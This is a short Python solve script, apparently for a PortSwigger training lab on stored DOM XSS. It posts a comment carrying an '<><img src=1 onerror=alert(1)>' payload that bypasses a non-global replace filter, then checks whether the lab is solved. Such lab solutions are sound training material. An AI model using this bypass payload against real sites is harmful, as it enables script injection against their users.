#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab: Stored DOM XSS
Posts a comment with a non-global-replace bypass payload, then verifies the lab is solved.
"""

import argparse
import requests
import re
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def main():
    parser = argparse.ArgumentParser(description="Solve XSS Lab 13: Stored DOM XSS")
    parser.add_argument("lab_url", help="Lab URL (e.g. https://0aXX00...web-security-academy.net)")
    args = parser.parse_args()

    lab = args.lab_url.rstrip("/")
    s = requests.Session()
    s.verify = False

    # Step 1: Fetch a blog post to get the CSRF token for commenting
    post_url = f"{lab}/post?postId=1"
    r = s.get(post_url)
    csrf_match = re.search(r'name="csrf" value="([^"]+)"', r.text)
    if not csrf_match:
        print("[-] Could not find CSRF token on blog post page")
        sys.exit(1)
    csrf = csrf_match.group(1)
    print(f"[+] CSRF token: {csrf[:20]}...")

    # Step 2: Post a comment with the bypass payload
    payload = "<><img src=1 onerror=alert(1)>"
    comment_data = {
        "csrf": csrf,
        "postId": "1",
        "comment": payload,
        "name": "attacker",
        "email": "attacker@evil.com",
        "website": "",
    }
    r = s.post(f"{lab}/post/comment", data=comment_data, allow_redirects=True)
    if r.status_code == 200:
        print(f"[+] Comment posted with payload: {payload}")
    else:
        print(f"[-] Comment post returned status {r.status_code}")
        sys.exit(1)

    # Step 3: Verify the payload is in the stored comments JSON
    r = s.get(f"{lab}/post/comment?postId=1")
    if "onerror" in r.text:
        print("[+] Payload confirmed in stored comments JSON")
    else:
        print("[!] Payload not found in comments JSON (may still work in browser)")

    # Step 4: Check if lab is solved
    r = s.get(lab)
    if "Congratulations" in r.text:
        print("[+] Lab solved!")
    else:
        print("[*] Lab not auto-solved — this is a DOM XSS; open the blog post in a browser to trigger alert(1)")
        print(f"    Visit: {post_url}")


if __name__ == "__main__":
    main()
